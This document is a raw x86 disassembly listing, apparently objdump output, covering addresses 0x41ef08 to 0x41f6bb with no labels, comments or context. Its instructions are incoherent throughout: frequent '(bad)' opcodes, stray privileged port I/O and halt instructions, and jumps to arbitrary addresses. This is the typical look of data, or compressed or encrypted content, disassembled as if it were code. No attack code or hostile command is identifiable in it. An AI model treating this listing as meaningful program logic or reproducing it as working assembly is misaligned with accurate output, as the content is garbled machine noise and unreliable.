  41ef08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef09:	out    0xfc,eax
  41ef0b:	mov    dh,0x35
  41ef0d:	mov    al,ds:0x1ecb98ed
  41ef12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef13:	fild   QWORD PTR [esp+edx*4-0x2]
  41ef17:	jo     0x41eee6
  41ef19:	jmp    0xdbfda136
  41ef1e:	fs icebp 
  41ef20:	jnp    0x41ef12
  41ef22:	ret    0x3c18
  41ef25:	js     0x41ef66
  41ef27:	xchg   ebp,eax
  41ef28:	fdivr  QWORD PTR ds:0x1c7741b1
  41ef2e:	push   edi
  41ef2f:	push   0xffffffb6
  41ef31:	mov    WORD PTR [eax+edx*2-0x2824c4ca],?
  41ef38:	pushf  
  41ef39:	sbb    al,0x11
  41ef3b:	sbb    eax,DWORD PTR [ecx-0x32]
  41ef3e:	mov    eax,ds:0x71f69305
  41ef43:	jecxz  0x41ef6c
  41ef45:	jg     0x41ef8b
  41ef47:	icebp  
  41ef48:	(bad)  
  41ef49:	jge    0x41efba
  41ef4b:	cmp    ah,BYTE PTR [ecx-0x8983699]
  41ef51:	sbb    esp,DWORD PTR [eax+eax*1]
  41ef54:	add    dh,ah
  41ef56:	mov    edi,DWORD PTR [ebx+ebx*1-0xa53e6c4]
  41ef5d:	mov    eax,0x2a6c6cd7
  41ef62:	pop    es
  41ef63:	daa    
  41ef64:	push   0xdf765911
  41ef69:	xlat   BYTE PTR ds:[ebx]
  41ef6a:	jp     0x41efbd
  41ef6c:	add    esp,DWORD PTR [edx+esi*4]
  41ef6f:	in     eax,dx
  41ef70:	jbe    0x41efbe
  41ef72:	retf   
  41ef73:	jmp    0x1cd1b367
  41ef78:	in     al,0xfa
  41ef7a:	or     edi,DWORD PTR [ebx+0x32]
  41ef7d:	retf   
  41ef7e:	cmp    ebp,DWORD PTR [edi+0x6ce3fd99]
  41ef84:	call   0xd5dbda4f
  41ef89:	dec    esp
  41ef8a:	adc    al,0x56
  41ef8c:	push   ebx
  41ef8d:	enter  0x8b6,0x41
  41ef91:	pop    es
  41ef92:	sbb    bl,dh
  41ef94:	sbb    dh,ch
  41ef96:	retf   0xace0
  41ef99:	scas   eax,DWORD PTR es:[edi]
  41ef9a:	repz retf 0xdc5a
  41ef9e:	in     al,0x9e
  41efa0:	cmc    
  41efa1:	sahf   
  41efa2:	dec    edx
  41efa3:	mov    esp,0xa3e7171f
  41efa8:	pop    eax
  41efa9:	into   
  41efaa:	push   ebp
  41efab:	adc    BYTE PTR [ecx+eiz*1+0x3d],ah
  41efaf:	imul   edx,esi,0x58
  41efb2:	fdiv   st,st(7)
  41efb4:	jmp    0x6b9b17fe
  41efb9:	cmp    BYTE PTR [edx+edi*2-0x2263a099],dh
  41efc0:	ror    DWORD PTR [ecx-0x12],1
  41efc3:	fdiv   st,st(7)
  41efc5:	out    0x4,eax
  41efc7:	cdq    
  41efc8:	jbe    0x41eff0
  41efca:	pop    DWORD PTR [esi]
  41efcc:	cli    
  41efcd:	aad    0xf6
  41efcf:	and    eax,0x9a1f6691
  41efd4:	xchg   esi,eax
  41efd5:	push   ecx
  41efd6:	add    DWORD PTR [eax+edx*1+0x4fdeb792],0x9
  41efde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efdf:	push   esi
  41efe0:	in     al,0x1e
  41efe2:	jbe    0x41efd1
  41efe4:	fs inc edi
  41efe6:	fdivr  st(7),st
  41efe8:	push   eax
  41efe9:	add    eax,0x5da7f7c1
  41efee:	dec    esp
  41efef:	and    DWORD PTR [edi-0x20],ecx
  41eff2:	mov    ch,0x18
  41eff4:	xchg   esi,eax
  41eff5:	xchg   esi,eax
  41eff6:	or     edi,eax
  41eff8:	mov    eax,0xcb4b2c65
  41effd:	push   0x1395f5eb
  41f002:	mov    ecx,0xc8878744
  41f007:	cwde   
  41f008:	fadd   DWORD PTR [esi+0xd]
  41f00b:	dec    esi
  41f00c:	loop   0x41effc
  41f00e:	pop    edi
  41f00f:	hlt    
  41f010:	icebp  
  41f011:	aaa    
  41f012:	add    eax,0xf3eb464b
  41f017:	std    
  41f018:	xchg   edx,eax
  41f019:	sbb    eax,0xb22cee73
  41f01e:	ret    
  41f01f:	js     0x41f089
  41f021:	mov    eax,0x7b7d3949
  41f026:	add    al,0x22
  41f028:	lods   eax,DWORD PTR ds:[esi]
  41f029:	ja     0x41f05f
  41f02b:	and    al,0xad
  41f02d:	xchg   esp,eax
  41f02e:	repz sub eax,0x9da5f76e
  41f034:	ret    0x134d
  41f037:	fidivr WORD PTR [ecx+edx*1+0x10]
  41f03b:	push   0xe6b38500
  41f040:	xor    bh,cl
  41f042:	sub    edi,ebx
  41f044:	rcl    BYTE PTR [eax],cl
  41f046:	jg     0x41f024
  41f048:	inc    ecx
  41f049:	sub    edi,ecx
  41f04b:	inc    edx
  41f04c:	je     0x41f091
  41f04e:	fadd   QWORD PTR [edi-0x4ece62d2]
  41f054:	clc    
  41f055:	mov    bh,0xde
  41f057:	pop    eax
  41f058:	cmp    eax,0x74d80e23
  41f05d:	cmp    eax,0x948a9e8e
  41f062:	aad    0x2c
  41f064:	and    al,0x54
  41f066:	in     eax,0xd2
  41f068:	call   0xa34a6024
  41f06d:	jnp    0x41f067
  41f06f:	mov    ds:0x64ea284a,eax
  41f074:	fst    QWORD PTR [eax-0x11cb6421]
  41f07a:	dec    esi
  41f07b:	in     eax,0xcb
  41f07d:	xor    eax,0x93087c07
  41f082:	push   ebx
  41f083:	xor    edi,esi
  41f085:	jne    0x41f0ef
  41f087:	fwait
  41f088:	in     al,dx
  41f089:	loopne 0x41f05f
  41f08b:	mov    ebp,0xd6e27470
  41f090:	sbb    ebp,DWORD PTR ds:0x443c3553
  41f096:	sahf   
  41f097:	aas    
  41f098:	jns    0x41f0dd
  41f09a:	fnstcw WORD PTR [ecx]
  41f09c:	rol    ecx,0x3f
  41f09f:	dec    eax
  41f0a0:	outs   dx,BYTE PTR ds:[esi]
  41f0a1:	cmc    
  41f0a2:	cmc    
  41f0a3:	sahf   
  41f0a4:	push   esp
  41f0a5:	test   ch,ah
  41f0a7:	ins    DWORD PTR es:[edi],dx
  41f0a8:	pop    ecx
  41f0a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0aa:	out    dx,al
  41f0ab:	adc    dl,BYTE PTR [esi]
  41f0ad:	sub    cl,BYTE PTR [edx]
  41f0af:	stos   BYTE PTR es:[edi],al
  41f0b0:	adc    eax,edi
  41f0b2:	or     DWORD PTR [ebp-0x3d],edx
  41f0b5:	add    eax,0xcde8298c
  41f0ba:	xchg   edx,eax
  41f0bb:	mov    ch,0x97
  41f0bd:	mov    dl,0x6d
  41f0bf:	shl    DWORD PTR [ebp-0x719f1763],cl
  41f0c5:	or     edx,DWORD PTR [edi]
  41f0c7:	test   bl,ah
  41f0c9:	adc    ebp,0x2be89edc
  41f0cf:	call   0xa38f4d34
  41f0d4:	sahf   
  41f0d5:	add    ch,BYTE PTR [edx+0xc0dba6e]
  41f0db:	cwde   
  41f0dc:	inc    ecx
  41f0dd:	xlat   BYTE PTR ds:[ebx]
  41f0de:	mov    BYTE PTR [ebp+0x43086deb],ah
  41f0e4:	pop    ds
  41f0e5:	hlt    
  41f0e6:	add    esi,DWORD PTR [edi]
  41f0e8:	dec    ebp
  41f0e9:	lods   eax,DWORD PTR ds:[esi]
  41f0ea:	inc    edx
  41f0eb:	cmp    ebp,ebx
  41f0ed:	pop    esi
  41f0ee:	and    al,0xbb
  41f0f0:	fmul   QWORD PTR ds:0xfad2c1ee
  41f0f6:	std    
  41f0f7:	mov    bp,0x66d8
  41f0fb:	ret    
  41f0fc:	jle    0x41f119
  41f0fe:	sahf   
  41f0ff:	cld    
  41f100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f101:	imul   esp,DWORD PTR [edi+eax*2-0x48d080a6],0xffffff98
  41f109:	shl    DWORD PTR [ebx],1
  41f10b:	pop    ebp
  41f10c:	cmovo  ebx,DWORD PTR [esi]
  41f10f:	sub    dl,dl
  41f111:	test   al,0xd3
  41f113:	daa    
  41f114:	fild   DWORD PTR [edx-0x30]
  41f118:	dec    ebp
  41f119:	dec    ebx
  41f11a:	mov    dh,0x4a
  41f11c:	loope  0x41f0bc
  41f11e:	sub    al,0x6b
  41f120:	jns    0x41f11c
  41f122:	mov    ebx,ecx
  41f124:	dec    ecx
  41f125:	es lock jge 0x41f0fe
  41f129:	fist   WORD PTR [ecx+0x78fdc0b6]
  41f12f:	lods   al,BYTE PTR ds:[esi]
  41f130:	jge    0x41f18f
  41f132:	fstp   DWORD PTR [esi-0x32]
  41f135:	nop
  41f136:	and    eax,0x4551fac6
  41f13b:	mov    si,0x33b7
  41f13f:	sub    eax,DWORD PTR [edx-0x56eb85f]
  41f145:	add    eax,0xa3210b10
  41f14a:	pop    esp
  41f14b:	loope  0x41f13b
  41f14d:	dec    ebx
  41f14e:	stc    
  41f14f:	out    dx,al
  41f150:	pop    ss
  41f151:	add    eax,0x99c93f98
  41f156:	mov    ds:0x36f5f5aa,eax
  41f15b:	std    
  41f15c:	dec    ebp
  41f15d:	dec    esi
  41f15e:	call   0x45ff693b
  41f163:	btr    DWORD PTR [edi+0xfa9fe5c],ecx
  41f16a:	daa    
  41f16b:	inc    esi
  41f16c:	rcl    BYTE PTR [esi],0x53
  41f16f:	jbe    0x41f1aa
  41f171:	mov    esi,0x7fc3b127
  41f176:	mov    WORD PTR [esi+0x14fe96a5],cs
  41f17c:	mov    bl,0xc5
  41f17e:	adc    eax,0x21af3b5c
  41f183:	jmp    0x24b4364d
  41f188:	inc    edi
  41f189:	andps  xmm4,XMMWORD PTR [ecx+edx*4-0x33]
  41f18e:	hlt    
  41f18f:	inc    eax
  41f190:	frstor [eax]
  41f192:	stos   BYTE PTR es:[edi],al
  41f193:	push   ebp
  41f194:	jmp    0xfdb436d0
  41f199:	jmp    0x649c9dac
  41f19e:	jge    0x41f1a9
  41f1a0:	mov    al,ds:0xa2d8ac96
  41f1a5:	xchg   ebp,eax
  41f1a6:	xchg   ebp,eax
  41f1a7:	in     eax,0xc9
  41f1a9:	es je  0x41f1f6
  41f1ac:	stos   BYTE PTR es:[edi],al
  41f1ad:	inc    ebx
  41f1ae:	mov    WORD PTR [ebp+eiz*8+0x2c48517f],cs
  41f1b5:	cdq    
  41f1b6:	jmp    ebp
  41f1b8:	sbb    BYTE PTR [esi-0x68],ah
  41f1bb:	cdq    
  41f1bc:	cmp    esi,ecx
  41f1be:	push   ss
  41f1bf:	pop    ebx
  41f1c0:	test   DWORD PTR [esi+0x396bdf61],edi
  41f1c6:	fisubr DWORD PTR [ecx+0x18]
  41f1c9:	push   cs
  41f1ca:	or     al,0x87
  41f1cc:	jno    0x41f1b7
  41f1ce:	jle    0x41f234
  41f1d0:	fwait
  41f1d1:	clc    
  41f1d2:	int    0xe8
  41f1d4:	pop    ds
  41f1d5:	inc    ebp
  41f1d6:	lea    esp,[eax+esi*8+0x5d]
  41f1da:	push   esp
  41f1db:	pop    edi
  41f1dc:	mov    eax,0x56e681fe
  41f1e1:	in     eax,dx
  41f1e2:	ret    0xeb65
  41f1e5:	pop    ebp
  41f1e6:	(bad)  
  41f1e7:	addr16 stc 
  41f1e9:	xlat   BYTE PTR ds:[ebx]
  41f1ea:	test   BYTE PTR [eax],al
  41f1ec:	mov    ch,0xc0
  41f1ee:	in     eax,dx
  41f1ef:	adc    dh,BYTE PTR [esi]
  41f1f1:	sub    al,0x51
  41f1f3:	test   DWORD PTR [edx],0xf7c5adc9
  41f1f9:	mov    dh,0xbc
  41f1fb:	and    ebp,ebp
  41f1fd:	fwait
  41f1fe:	push   0xc7263b47
  41f203:	sub    eax,0xf6036f72
  41f208:	pop    es
  41f209:	cmp    DWORD PTR [ecx+0x71],ebp
  41f20c:	mov    ss,edi
  41f20e:	add    ch,cl
  41f210:	aam    0xe3
  41f212:	jb     0x41f248
  41f214:	test   eax,0xf8bfefa4
  41f219:	data16 rcl BYTE PTR [ebx+0x7120e0d0],0x2d
  41f221:	adc    DWORD PTR [ecx+0x47],0x32dc2a27
  41f228:	and    edx,DWORD PTR [esi+0x55421beb]
  41f22e:	sbb    eax,0xe143a96e
  41f233:	out    dx,al
  41f234:	inc    esp
  41f235:	lds    ebx,FWORD PTR [eax+0x38]
  41f238:	mov    ds:0x20d2d833,al
  41f23d:	jbe    0x41f25d
  41f23f:	nop
  41f240:	test   BYTE PTR [ecx-0x71cb3e65],bl
  41f246:	or     eax,0x843dee7
  41f24b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f24c:	into   
  41f24d:	stos   BYTE PTR es:[edi],al
  41f24e:	push   ss
  41f24f:	les    ebp,FWORD PTR gs:[edx+0x15]
  41f253:	xchg   esi,eax
  41f254:	test   BYTE PTR ds:0x2eb0990b,al
  41f25a:	mov    eax,ds:0xeb2ba160
  41f25f:	test   al,0xb5
  41f261:	dec    ebp
  41f262:	int    0x4
  41f264:	push   ebx
  41f265:	popa   
  41f266:	adc    al,0xda
  41f268:	in     al,0x8a
  41f26a:	mov    esi,0xffdbaa47
  41f26f:	hlt    
  41f270:	sub    esp,0xdf9d05c
  41f276:	mov    ecx,0x761b242d
  41f27b:	jge    0x41f2cb
  41f27d:	dec    edx
  41f27e:	inc    esp
  41f27f:	inc    eax
  41f280:	push   ecx
  41f281:	cld    
  41f282:	xor    al,0x49
  41f284:	(bad)  
  41f285:	xor    cl,dh
  41f287:	outs   dx,DWORD PTR ds:[esi]
  41f288:	imul   ebx,DWORD PTR [ecx],0xdf1a8bd5
  41f28e:	mov    ch,0x0
  41f290:	jge    0x41f282
  41f292:	and    edi,DWORD PTR [ebp-0x64]
  41f295:	iret   
  41f296:	sub    DWORD PTR [ebx+0x20],edx
  41f299:	sub    al,0xa1
  41f29b:	push   edi
  41f29c:	jbe    0x41f222
  41f29e:	(bad)  
  41f29f:	pushf  
  41f2a0:	outs   dx,DWORD PTR ds:[esi]
  41f2a1:	lds    ebx,FWORD PTR [ecx+eax*8]
  41f2a4:	outs   dx,BYTE PTR ds:[esi]
  41f2a5:	mov    bh,0xcd
  41f2a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2a8:	pop    esp
  41f2a9:	cld    
  41f2aa:	pop    esp
  41f2ab:	jns    0x41f2ea
  41f2ad:	mov    dh,al
  41f2af:	jbe    0x41f238
  41f2b1:	add    esp,edi
  41f2b3:	mov    dh,0x90
  41f2b5:	pop    esp
  41f2b6:	jb     0x41f24b
  41f2b8:	cmp    al,0x4f
  41f2ba:	dec    esp
  41f2bb:	xchg   esp,eax
  41f2bc:	(bad)  
  41f2bd:	jp     0x41f2c0
  41f2bf:	xchg   ebp,eax
  41f2c0:	ins    DWORD PTR es:[edi],dx
  41f2c1:	cwde   
  41f2c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2c3:	loopne 0x41f2a4
  41f2c5:	push   ds
  41f2c6:	mov    ds:0x5cf1b1f3,eax
  41f2cb:	out    dx,eax
  41f2cc:	loop   0x41f303
  41f2ce:	inc    ecx
  41f2cf:	jp     0x41f2cd
  41f2d1:	push   es
  41f2d2:	stc    
  41f2d3:	mov    edx,0xa05a64d7
  41f2d8:	test   BYTE PTR [ebp-0x2],bl
  41f2db:	cmp    al,0xc2
  41f2dd:	lea    esi,[ebx-0x5797072d]
  41f2e3:	mov    eax,ds:0x7a7ed287
  41f2e8:	push   ebx
  41f2e9:	mov    ds:0xeb599113,al
  41f2ee:	xor    dl,BYTE PTR ss:[esi+0x66652403]
  41f2f5:	xor    ebx,esp
  41f2f7:	sub    dh,cl
  41f2f9:	xchg   esi,eax
  41f2fa:	or     DWORD PTR [edx-0x78],ebx
  41f2fd:	aad    0xaa
  41f2ff:	xchg   edx,eax
  41f300:	and    eax,0x3109792d
  41f305:	and    DWORD PTR ds:0x3e411c3c,0x3c
  41f30c:	add    edi,DWORD PTR ss:[ebp+ebx*2-0x4f]
  41f311:	mov    WORD PTR [edi-0x50aef5b4],gs
  41f317:	scas   al,BYTE PTR es:[edi]
  41f318:	cmp    ah,BYTE PTR [edx+0x624387fc]
  41f31e:	sub    bh,BYTE PTR [ebx-0xfdd8ce1]
  41f324:	lahf   
  41f325:	cld    
  41f326:	xchg   DWORD PTR [ecx],ebx
  41f328:	dec    ebp
  41f329:	test   al,0xcf
  41f32b:	or     al,BYTE PTR [ebp+0xfc63fd0]
  41f331:	mov    dl,0x88
  41f333:	sub    al,0xf
  41f335:	mov    ds:0xed224c04,eax
  41f33b:	enter  0x35d6,0xc0
  41f33f:	push   0x22
  41f341:	imul   esi,DWORD PTR ds:0x85f132e6,0xbcb2592f
  41f34b:	mov    dh,0xd
  41f34d:	or     eax,0xaedd85f1
  41f352:	in     al,0x39
  41f354:	retf   0xff88
  41f357:	cmp    al,bl
  41f359:	ffreep st(4)
  41f35b:	inc    ecx
  41f35c:	(bad)  
  41f35d:	dec    edi
  41f35e:	repz in al,dx
  41f360:	gs dec edx
  41f362:	(bad)  
  41f363:	jmp    0x41f30f
  41f365:	ret    
  41f366:	(bad)  
  41f367:	mov    ds:0xd37dded3,eax
  41f36c:	cmp    eax,0x3a0a88f3
  41f371:	(bad)  
  41f372:	ror    DWORD PTR [edx+ebp*4-0x2e],1
  41f376:	test   DWORD PTR [ecx],esp
  41f378:	sar    BYTE PTR [edi-0x3],cl
  41f37b:	test   BYTE PTR [edi],ch
  41f37d:	into   
  41f37e:	ins    DWORD PTR es:[edi],dx
  41f37f:	mov    ah,0xfa
  41f381:	and    ecx,ebp
  41f383:	out    dx,al
  41f384:	jmp    0x54748f76
  41f389:	mov    WORD PTR [ebp+0x4ca29ef2],?
  41f38f:	retf   
  41f390:	push   esp
  41f391:	jmp    0x553e:0xe575692c
  41f398:	mov    ah,0x8f
  41f39a:	or     ecx,DWORD PTR [eax+0x5e4327cf]
  41f3a0:	adc    al,0x58
  41f3a3:	enter  0xf76c,0x66
  41f3a7:	xor    BYTE PTR [ebp+0x57bdb84a],bl
  41f3ad:	jnp    0x41f3b6
  41f3af:	test   edi,ebx
  41f3b1:	into   
  41f3b2:	jbe    0x41f3ee
  41f3b4:	repnz in eax,0x85
  41f3b7:	lods   eax,DWORD PTR ds:[esi]
  41f3b8:	cmp    BYTE PTR [esi],dh
  41f3ba:	mov    eax,0xfddfbb9f
  41f3bf:	cli    
  41f3c0:	cmp    DWORD PTR [eax],0xffffffcc
  41f3c3:	sub    eax,0xd43c5094
  41f3c8:	xchg   edi,eax
  41f3c9:	push   es
  41f3ca:	mov    eax,ds:0x3382909d
  41f3cf:	test   al,0x91
  41f3d1:	dec    ecx
  41f3d2:	and    BYTE PTR [esi+0x1f],ch
  41f3d5:	out    0x4f,al
  41f3d7:	rol    BYTE PTR [ebp-0x7],0x19
  41f3db:	jnp    0x41f3fe
  41f3dd:	cmp    ecx,DWORD PTR [esi]
  41f3df:	jecxz  0x41f3f3
  41f3e1:	fcom   DWORD PTR [esi+0x30]
  41f3e4:	imul   ebx,DWORD PTR [ecx-0x35984253],0xffffffa7
  41f3eb:	push   edx
  41f3ec:	jmp    0x4ad91cee
  41f3f1:	pop    ss
  41f3f2:	je     0x41f3ce
  41f3f4:	mov    eax,0x7aab5b2d
  41f3f9:	sub    al,0x42
  41f3fb:	call   0xcd2a2e90
  41f400:	inc    edx
  41f401:	inc    esp
  41f402:	or     DWORD PTR [esi+0x222b423a],0xc673ce86
  41f40c:	stos   BYTE PTR es:[edi],al
  41f40d:	add    dh,BYTE PTR [ebp+0x686c3375]
  41f413:	sub    dl,BYTE PTR [ebx+ebp*2-0xe]
  41f417:	adc    eax,0x38c7beee
  41f41c:	clc    
  41f41d:	(bad)  
  41f41e:	sub    ebp,DWORD PTR [ecx-0x51d45d57]
  41f424:	fs clc 
  41f426:	adc    BYTE PTR ds:0xbaabb924,0x15
  41f42d:	ja     0x41f440
  41f42f:	jo     0x41f3b8
  41f431:	dec    edx
  41f432:	push   ecx
  41f433:	xchg   esi,eax
  41f434:	jge    0x41f494
  41f436:	(bad)  
  41f437:	fidivr DWORD PTR [esi-0x58102b1b]
  41f43d:	cmp    eax,0x84a653d3
  41f442:	dec    edi
  41f443:	or     ebx,esp
  41f445:	mov    al,ds:0x7767ddf5
  41f44a:	mov    bl,0x8d
  41f44c:	dec    eax
  41f44d:	pop    edi
  41f44e:	bound  ebx,QWORD PTR [esp+edx*1-0x5980b019]
  41f455:	ins    DWORD PTR es:[edi],dx
  41f456:	xor    sp,WORD PTR [ecx]
  41f459:	xchg   BYTE PTR [ebp+0x1a],ah
  41f45c:	adc    DWORD PTR [ecx+0x592bb53d],0x16b06e7a
  41f466:	test   eax,0x36226d06
  41f46b:	stos   DWORD PTR es:[edi],eax
  41f46c:	aam    0xa2
  41f46e:	(bad)  
  41f46f:	in     al,dx
  41f470:	stc    
  41f471:	js     0x41f488
  41f473:	inc    esp
  41f474:	test   DWORD PTR [esi],0x3d87a003
  41f47a:	add    al,0x98
  41f47c:	jp     0x41f4b2
  41f47e:	or     al,0xe8
  41f480:	lea    edx,[edx+0x7b933fee]
  41f486:	push   esp
  41f487:	sub    BYTE PTR [ebx+0x61],al
  41f48a:	mov    ebp,0xf2504568
  41f48f:	inc    eax
  41f490:	sub    esp,DWORD PTR [ebp+0x4fecb0df]
  41f496:	pop    edx
  41f497:	nop
  41f498:	inc    ecx
  41f499:	adc    eax,0x6a7d9dff
  41f49e:	out    0xce,eax
  41f4a0:	xor    al,0x3e
  41f4a2:	and    DWORD PTR [ebp-0x6b4436a7],esi
  41f4a8:	test   eax,0x32e7cf97
  41f4ad:	sbb    DWORD PTR [ecx+0x6b],eax
  41f4b0:	dec    esi
  41f4b1:	and    al,BYTE PTR ds:0xb85a8c97
  41f4b7:	gs dec ebx
  41f4b9:	mov    fs,WORD PTR ds:[ebx]
  41f4bc:	xor    esi,DWORD PTR [edi-0x7b]
  41f4bf:	add    edx,DWORD PTR [edi]
  41f4c1:	add    edx,DWORD PTR [ecx+0x618c38a9]
  41f4c7:	rol    esi,0xc3
  41f4ca:	mov    eax,0x9d478082
  41f4cf:	dec    ebp
  41f4d0:	and    al,0x3d
  41f4d2:	stos   BYTE PTR es:[edi],al
  41f4d3:	dec    esp
  41f4d4:	mov    bh,0x99
  41f4d6:	xlat   BYTE PTR ds:[ebx]
  41f4d7:	xchg   edi,eax
  41f4d8:	int    0x6e
  41f4da:	ja     0x41f4b5
  41f4dc:	mov    ss,ebx
  41f4de:	pusha  
  41f4df:	and    eax,0xa70764ed
  41f4e4:	jp     0x41f468
  41f4e6:	sub    edi,ebp
  41f4e8:	mov    bl,0x87
  41f4ea:	(bad)  
  41f4eb:	mov    bh,0x62
  41f4ed:	mov    dh,0x66
  41f4ef:	inc    ebx
  41f4f0:	lods   eax,DWORD PTR ds:[esi]
  41f4f1:	daa    
  41f4f2:	ss call 0x35e595d7
  41f4f8:	dec    esp
  41f4f9:	je     0x41f4cc
  41f4fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4fc:	or     eax,0x8ef5d61e
  41f501:	jae    0x41f489
  41f503:	sub    ch,BYTE PTR [ebx+0x44]
  41f506:	shr    esp,1
  41f508:	inc    eax
  41f509:	fnstsw WORD PTR [esi+0x43]
  41f50c:	aam    0x7
  41f50e:	ins    DWORD PTR es:[edi],dx
  41f50f:	add    eax,0xf45a53ec
  41f514:	bound  esp,QWORD PTR [esi+0x36]
  41f517:	mov    bh,0x27
  41f519:	rcr    BYTE PTR [ebp+0xd0e394c],cl
  41f51f:	inc    esi
  41f520:	push   esp
  41f521:	cmp    ah,al
  41f523:	sub    dh,bh
  41f525:	or     DWORD PTR [ebx],0x37
  41f528:	sub    BYTE PTR [ebp+eax*1-0x63],bh
  41f52c:	xor    bh,BYTE PTR [ecx-0x79cd029a]
  41f532:	into   
  41f533:	and    esi,ecx
  41f535:	jae    0x41f55a
  41f537:	cmp    DWORD PTR [ecx-0x65dffd89],0xa239f8b1
  41f541:	dec    eax
  41f542:	out    0x4c,eax
  41f544:	pop    ecx
  41f545:	mov    ah,0xa4
  41f547:	xor    al,0x5d
  41f549:	in     eax,0xbe
  41f54b:	fcomp  DWORD PTR ds:0xe6c3e233
  41f551:	xchg   esp,eax
  41f552:	je     0x41f546
  41f554:	push   edx
  41f555:	sub    ebp,0xbbfdaa8c
  41f55b:	mov    bl,BYTE PTR [eax-0x6d]
  41f55e:	inc    eax
  41f55f:	mov    esi,0x8762dd40
  41f565:	cli    
  41f566:	or     edi,ebp
  41f568:	dec    ecx
  41f569:	mov    cl,0x72
  41f56b:	adc    DWORD PTR [eax-0x4b83f0c8],ebp
  41f571:	xchg   ecx,eax
  41f572:	fidivr DWORD PTR [ecx-0x62]
  41f575:	imul   ecx,DWORD PTR [ecx-0x23],0xdfc57220
  41f57c:	pop    edx
  41f57d:	outs   dx,BYTE PTR ds:[esi]
  41f57e:	jno    0x41f590
  41f580:	je     0x41f53a
  41f582:	push   ds
  41f583:	pop    es
  41f584:	test   al,0x19
  41f586:	sub    esi,DWORD PTR [edi+0x1]
  41f589:	lock cmp eax,0x90cfd10a
  41f58f:	jl     0x41f5f7
  41f591:	ins    BYTE PTR es:[edi],dx
  41f592:	mov    cl,BYTE PTR [edx]
  41f594:	add    DWORD PTR [esi+0xa55cecf],ecx
  41f59a:	sahf   
  41f59b:	stos   DWORD PTR es:[edi],eax
  41f59c:	add    BYTE PTR [esi+0x3],cl
  41f59f:	push   edi
  41f5a0:	jno    0x41f5d8
  41f5a2:	fst    st(4)
  41f5a4:	shr    BYTE PTR [eax-0x50],1
  41f5a7:	pushf  
  41f5a8:	xor    al,0xc8
  41f5aa:	lea    edi,[ebp-0x20533d77]
  41f5b0:	mov    edi,DWORD PTR [ebx+0x45]
  41f5b3:	inc    esi
  41f5b4:	push   ss
  41f5b5:	repnz sub ebx,DWORD PTR ds:0xf35087c5
  41f5bc:	sub    ebx,0xb77a47b
  41f5c2:	fnstenv [esp+edx*8-0x96ead3c]
  41f5c9:	fnsave ds:0x8a49a19c
  41f5cf:	mov    ebp,0xe76f713c
  41f5d4:	cmp    ebp,DWORD PTR [edx-0x17]
  41f5d7:	xchg   ecx,eax
  41f5d8:	cmp    eax,0x12778cfd
  41f5dd:	sahf   
  41f5de:	cli    
  41f5df:	es retf 
  41f5e1:	pop    edi
  41f5e2:	mov    ecx,0x7671f20a
  41f5e7:	mov    dh,0x78
  41f5e9:	xchg   edx,eax
  41f5ea:	add    al,al
  41f5ec:	pop    ds
  41f5ed:	pop    ebx
  41f5ee:	dec    esi
  41f5ef:	dec    sp
  41f5f1:	and    BYTE PTR [ebx+0x60e47147],dl
  41f5f7:	adc    cl,cl
  41f5f9:	repz lea esi,[esi]
  41f5fc:	pop    ecx
  41f5fd:	lock mov ah,BYTE PTR [edi+0x2f]
  41f601:	add    ah,BYTE PTR [eax-0x5ef195e4]
  41f607:	push   0xffffffd1
  41f609:	mov    dh,0x84
  41f60b:	jp     0x41f665
  41f60d:	loope  0x41f656
  41f60f:	repnz ds pop ecx
  41f612:	push   0x27
  41f614:	pop    es
  41f615:	cld    
  41f616:	(bad)  
  41f617:	stc    
  41f618:	imul   eax,DWORD PTR [esi-0x354e5909],0xe427e1
  41f622:	sbb    ecx,eax
  41f624:	sti    
  41f625:	mov    ch,0xdd
  41f627:	lahf   
  41f628:	mov    al,ds:0x1f318bde
  41f62d:	or     ah,BYTE PTR [ebx-0x28d71899]
  41f633:	sti    
  41f634:	into   
  41f635:	ins    BYTE PTR es:[edi],dx
  41f636:	mov    bh,0x22
  41f638:	repnz fcmove st,st(2)
  41f63b:	cmp    al,0xeb
  41f63d:	lods   eax,DWORD PTR ds:[esi]
  41f63e:	add    al,0x97
  41f640:	daa    
  41f641:	mov    cl,0xa2
  41f643:	jmp    0x78c3:0xafaad220
  41f64a:	fldenv [eax-0x65e16e65]
  41f650:	nop
  41f651:	xchg   ecx,eax
  41f652:	cmp    eax,0xf7c12ad0
  41f657:	xor    edx,DWORD PTR [edi]
  41f659:	(bad)  
  41f65a:	adc    cl,cl
  41f65c:	retf   
  41f65d:	mov    al,0x7b
  41f65f:	loope  0x41f6c1
  41f661:	jge    0x41f69e
  41f663:	fidivr WORD PTR [eax]
  41f665:	repz fcmovne st,st(3)
  41f668:	ffree  st(5)
  41f66a:	ss dec esi
  41f66c:	pop    ecx
  41f66d:	push   ds
  41f66e:	xor    al,0x7f
  41f670:	sbb    ebp,DWORD PTR [ebx-0x71]
  41f673:	pop    esi
  41f674:	xchg   ecx,eax
  41f675:	ds mov eax,fs
  41f678:	pop    esi
  41f679:	adc    BYTE PTR [ebp-0x30],ah
  41f67c:	mov    edi,ebp
  41f67e:	inc    eax
  41f67f:	je     0x41f6ac
  41f681:	adc    edx,DWORD PTR [esi-0x28]
  41f684:	sub    al,0xd4
  41f686:	add    bl,BYTE PTR [eax+0x71]
  41f689:	in     al,0x19
  41f68b:	int3   
  41f68c:	popa   
  41f68d:	jnp    0x41f661
  41f68f:	xchg   esp,eax
  41f690:	repnz pop ebx
  41f692:	mov    cl,0xfb
  41f694:	dec    eax
  41f695:	xchg   esp,eax
  41f696:	vpcmpeqw ymm6,ymm2,ymm5
  41f69a:	fiadd  WORD PTR [edx+ebx*1]
  41f69d:	gs adc eax,0x98efdbe1
  41f6a3:	mov    eax,0xa0bd6978
  41f6a8:	cmp    eax,0x45e19a91
  41f6ad:	mov    esi,0x40a3723c
  41f6b2:	aas    
  41f6b3:	les    eax,FWORD PTR [ebp+0x542be5d7]
  41f6b9:	jo     0x41f729
  41f6bb:	cmp    DWORD PTR [ecx-0x60],esp
